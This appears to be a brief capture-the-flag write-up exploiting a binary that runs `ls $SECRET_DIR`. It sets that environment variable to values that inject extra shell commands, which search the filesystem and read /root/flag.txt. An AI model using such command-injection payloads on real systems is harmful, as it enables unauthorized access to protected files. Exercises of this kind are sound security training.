The binary seems to execute `ls $SECRET_DIR`

```shell
env -i SECRET_DIR='-R / | grep -i "flag"' ./bin 
```

There's a `flag.txt`, let's find it:

```shell
env -i SECRET_DIR='; find / -name "flag.txt"' ./bin 
```

It is located at `/root/flag.txt`

```shell
env -i SECRET_DIR=';cat /root/flag.txt' ./bin 
```
